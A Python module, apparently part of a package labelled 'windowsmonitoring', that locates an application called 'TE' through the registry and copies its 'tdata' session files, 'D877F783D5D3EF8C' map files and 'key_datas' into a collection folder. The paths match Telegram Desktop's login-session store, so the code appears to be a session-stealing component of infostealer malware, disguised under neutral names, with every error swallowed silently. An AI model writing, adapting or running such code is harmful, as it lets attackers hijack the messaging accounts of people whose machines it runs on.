from re import findall
from os import listdir, path
from typing import Optional
from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER

from systoring.windowsmonitoring.helpers import MemoryStorage
from systoring.windowsmonitoring.helpers.config import TEConfig
from systoring.windowsmonitoring.helpers.dataclasses import Data


class TE:
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = TEConfig()
        self.__storage = MemoryStorage()

    def __get_TE_path(self) -> Optional[str]:
        """
        Gets the TE installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: TE installation path if found.
        """
        if path.exists(self.__config.SessionsPath):
            return self.__config.SessionsPath

        try:
            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")

            for i in range(QueryInfoKey(key)[0]):

                subkey_name = EnumKey(key, i)
                subkey = OpenKey(key, subkey_name)

                try:
                    display_name = QueryValueEx(subkey, "DisplayName")[0]

                    if "TE" not in display_name:
                        continue

                    return QueryValueEx(subkey, "InstallLocation")[0]
                except FileNotFoundError:
                    pass
        except Exception as e:
            pass

        return None

    def __get_sessions(self) -> None:
        """
        Collects sessions from the TE.

        Parameters:
        - None.

        Returns:
        - None.
        """
        TE_path = self.__get_TE_path()

        if not TE_path:
            return

        TE_data = path.join(TE_path, "tdata")
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(TE_data)], [])

        if not sessions:
            return

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            self.__storage.add_from_disk(
                path.join(TE_data, session),
                path.join(self.__folder, session)
            )

        maps = sum([findall(r"map.*", file) for file in listdir(path.join(TE_data, "D877F783D5D3EF8C"))], [])

        for map in maps:
            self.__storage.add_from_disk(
                path.join(TE_data, "D877F783D5D3EF8C", map),
                path.join(self.__folder, "D877F783D5D3EF8C", map)
            )

        self.__storage.add_from_disk(
            path.join(TE_data, "key_datas"),
            path.join(self.__folder, "key_datas")
        )

        self.__storage.add_data("Application", "TE")

    def run(self) -> Data:
        """
        Launches the TE collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_sessions()

            return self.__storage.get_data()

        except Exception as e:
            pass
